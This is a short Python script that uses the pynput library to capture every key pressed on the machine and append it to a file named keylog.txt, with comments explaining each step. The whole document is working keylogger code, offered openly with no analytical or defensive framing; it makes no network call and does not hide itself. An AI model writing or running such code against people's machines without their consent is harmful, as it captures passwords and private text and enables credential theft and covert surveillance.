from pynput.keyboard import Listener

# This function will be called whenever a key is pressed
def on_press(key):
    try:
        # If the key is a regular character
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'{key.char}\n')
    except AttributeError:
        # Special keys like "Space", "Enter" etc.
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'{key}\n')

# Set up the listener to listen for key presses
with Listener(on_press=on_press) as listener:
    listener.join()
